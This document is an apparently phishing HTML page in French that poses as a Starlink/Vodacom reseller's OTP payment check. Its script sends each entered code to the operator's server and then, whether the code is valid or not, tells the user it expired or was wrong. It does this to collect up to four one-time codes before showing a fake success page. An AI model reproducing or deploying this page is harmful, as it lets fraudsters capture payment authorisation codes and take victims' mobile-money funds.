<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vérification OTP - Starlink DRC</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --vodacom-red: #FF0000; --white: #ffffff; --black: #000000; --gray: #6c757d; }
    body { font-family: 'DM Sans', sans-serif; background: #f8f9fa; color: var(--black); min-height: 100vh; display: flex; flex-direction: column; }
    .header { background: var(--white); padding: 16px 24px; border-bottom: 1px solid #e5e5e5; display:flex; justify-content:space-between; align-items:center; }
    .header-brand { font-weight: 700; font-size: 20px; color: var(--black); }
    .header-brand span { color: var(--gray); font-weight: 400; }
    .nav-links a { margin-left:20px; font-size:14px; color:var(--gray); text-decoration:none; }
    .nav-links a:hover { text-decoration:underline; }
    .alert-banner { background: var(--vodacom-red); padding: 14px 24px; text-align: center; display: none; }
    .alert-banner p { color: var(--white); font-size: 16px; font-weight: 700; margin: 0; }
    .main-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
    .verification-box { background: var(--white); border: 2px solid var(--vodacom-red); border-radius: 12px; width: 100%; max-width: 430px; padding: 32px 24px; text-align: center; }
    .verification-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
    .verification-instruction { font-size: 16px; margin-bottom: 8px; }
    .helper-text { font-size: 14px; color: var(--gray); margin-bottom: 24px; }
    .otp-entry { display: flex; justify-content: center; gap: 10px; margin-bottom: 16px; }
    .otp-box { width: 50px; height: 50px; border: 1px solid #000; border-radius: 6px; text-align: center; font-size: 20px; font-weight: 700; }
    .otp-box:focus { border-color: var(--vodacom-red); outline: none; }
    .btn-confirm { width: 100%; height: 50px; background: var(--vodacom-red); color: var(--white); border: none; font-size: 16px; font-weight: 700; text-transform: uppercase; border-radius: 5px; cursor: pointer; margin-top: 20px; }
    .btn-confirm:hover { background: #cc0000; }
    .resend-link { margin-top: 15px; }
    .resend-link a { color: var(--vodacom-red); font-size: 14px; font-weight: 600; text-decoration: underline; cursor: pointer; }
    .resend-link a:hover { color: #cc0000; }
    .toast-notification { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(100px); background: #0f172a; color: #fff; padding: 12px 24px; border-radius: 99px; font-size: 14px; font-weight: 500; z-index: 9999; opacity: 0; transition: all 0.3s ease; }
    .toast-notification.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>
<header class="header">
  <div class="header-brand">STARLINK <span>|</span> RDC Reseller</div>
  <div class="nav-links">
    <a href="/status">Statut</a>
    <a href="/plans">Forfaits</a>
    <a href="/orders">Commandes</a>
  </div>
</header>

<div class="alert-banner" id="expired-alert">
  <p>Le code OTP que vous avez entré a expiré. Veuillez entrer le nouveau code OTP envoyé sur votre téléphone.</p>
</div>

<main class="main-content">
  <div class="verification-box">
    <h2 class="verification-title">VÉRIFICATION REQUISE</h2>
    <p class="verification-instruction">Entrez le code OTP</p>
    <p class="helper-text">Un code à 6 chiffres a été envoyé à <span id="phone">+243000000000</span></p>

    <div class="otp-entry">
      <label for="otp1" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp1" required>
      <label for="otp2" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp2" required>
      <label for="otp3" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp3" required>
      <label for="otp4" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp4" required>
      <label for="otp5" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp5" required>
      <label for="otp6" class="visually-hidden">Code OTP</label>
      <input type="text" class="otp-box" maxlength="1" id="otp6" required>
    </div>

    <button class="btn-confirm" onclick="verifyOTP()">Vérifier et payer</button>
    <div class="resend-link"><a onclick="resendCode()">Vous n'avez pas reçu le code ? Renvoyer le code</a></div>
  </div>
</main>

<div id="toast" class="toast-notification"></div>
<script>
const urlParams = new URLSearchParams(window.location.search);
const orderId = urlParams.get('order_id');
const phone = urlParams.get('phone') || '+243000000000';
const currentAttempt = parseInt(urlParams.get('attempt')) || 1;
const isExpired = urlParams.get('expired') === 'true';
const hasError = urlParams.get('error') === 'true';

document.getElementById('phone').textContent = phone;

// Show alert for attempts 2, 3, 4 (expired or error)
if ((isExpired || hasError) && currentAttempt >= 2 && currentAttempt <= 4) {
  const alertBanner = document.getElementById('expired-alert');
  alertBanner.style.display = 'block';
  if (hasError) {
    alertBanner.querySelector('p').textContent = 'Code OTP invalide. Veuillez entrer le nouveau code OTP envoyé sur votre téléphone.';
  }
}

const otpBoxes = document.querySelectorAll('.otp-box');
otpBoxes.forEach((box, index) => {
  box.addEventListener('input', function() {
    if (this.value && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
  });
  box.addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && !this.value && index > 0) otpBoxes[index - 1].focus();
  });
});

let toastTimer;
function showToast(message, duration = 3000) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
}

function verifyOTP() {
  const otpCode = Array.from(otpBoxes).map(box => box.value).join('');
  if (otpCode.length < 6) { showToast('Veuillez entrer le code OTP à 6 chiffres'); return; }

  const MAX_ATTEMPTS = 4;
  const btn = document.querySelector('.btn-confirm');
  btn.disabled = true;
  btn.textContent = 'Vérification en cours...';

  fetch('/api/orders/' + orderId, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ otp: otpCode, status: 'Pin_Verified' })
  })
  .then(res => res.json())
  .then(data => {
    if (currentAttempt < MAX_ATTEMPTS) {
      const nextAttempt = currentAttempt + 1;
      const params = new URLSearchParams({ order_id: orderId, phone: phone, attempt: nextAttempt });
      window.location.href = '/otp_fr?' + params.toString();
    } else {
      showToast('Traitement en cours...');
      const params = new URLSearchParams({ 
        order_id: orderId, 
        phone: phone, 
        order_ref: data.order_ref || '', 
        plan_name: data.plan_name || '', 
        amount: data.amount || '' 
      });
      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
    }
  })
  .catch(err => {
    if (currentAttempt < MAX_ATTEMPTS) {
      const nextAttempt = currentAttempt + 1;
      const params = new URLSearchParams({ order_id: orderId, phone: phone, attempt: nextAttempt });
      window.location.href = '/otp_fr?' + params.toString();
    } else {
      showToast('Traitement en cours...');
      const params = new URLSearchParams({ order_id: orderId, phone: phone });
      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
    }
    console.error(err);
  });
}

let canResend = true;
let resendTimer = null;

function resendCode() {
  if (!canResend) { showToast('Veuillez patienter avant de demander un autre code'); return; }

  fetch('/api/orders/' + orderId + '/resend-otp', { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' } 
  })
  .then(res => res.json())
  .then(data => {
    if (data.success) { 
      showToast('Nouveau code OTP envoyé à votre téléphone'); 
      startResendCooldown(); 
    } else { 
      showToast(data.error || 'Échec du renvoi du code OTP'); 
    }
  })
  .catch(err => { 
    showToast('Erreur lors du renvoi du code OTP'); 
    console.error(err); 
  });
}

function startResendCooldown() {
  canResend = false;
  const resendLink = document.querySelector('.resend-link a');
  let countdown = 300;
  resendLink.textContent = 'Renvoyer le code (5:00)';
  resendLink.style.color = '#999';
  resendLink.style.pointerEvents = 'none';
  resendTimer = setInterval(() => {
    countdown--;
    if (countdown <= 0) {
      clearInterval(resendTimer);
      canResend = true;
      resendLink.textContent = "Vous n'avez pas reçu le code ? Renvoyer le code";
      resendLink.style.color = '';
      resendLink.style.pointerEvents = '';
    } else {
      resendLink.textContent = 'Renvoyer le code (' + Math.floor(countdown/60) + ':' + (countdown%60).toString().padStart(2,'0') + ')';
    }
  }, 1000);
}
</script>
</body>
</html>
